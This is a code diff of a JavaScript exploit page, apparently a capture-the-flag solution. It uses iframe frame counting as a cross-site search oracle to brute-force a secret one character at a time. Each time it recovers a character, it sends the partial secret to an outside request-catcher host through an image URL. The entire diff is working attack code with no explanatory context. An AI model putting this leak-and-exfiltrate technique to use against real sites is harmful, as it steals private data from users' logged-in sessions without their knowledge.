@@ -3,23 +3,20 @@
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-			var myiframe = document.createElement('iframe');
-			myiframe.src = url;
-			myiframe.onload = function () {
-				console.log("first request");
-				myiframe.onload = function () {
-					console.log("second request");
-				}
-				myiframe.src = myiframe.src + '#'
-			}
-			document.body.appendChild(myiframe);
-
+            const iframe = document.getElementById("iframe");
+            iframe.src = url;
+            iframe.onload = () => { 
+                if (iframe.contentWindow.frames.length != 0)
+                    return reject();
+                else
+                    return resolve();
+            };
         });
     }
     async function search(query) {
         try {
             await req(
-              `http://host3.dreamhack.games:9962/search?keyword=${query}`
+              `https://localhost:8000/search?keyword=${query}`
             );
             return true;
         } catch (e) {
@@ -33,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://uqksfhz.request.dreamhack.games/${secret}`;
+                    img.src = `https://wabihzn.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
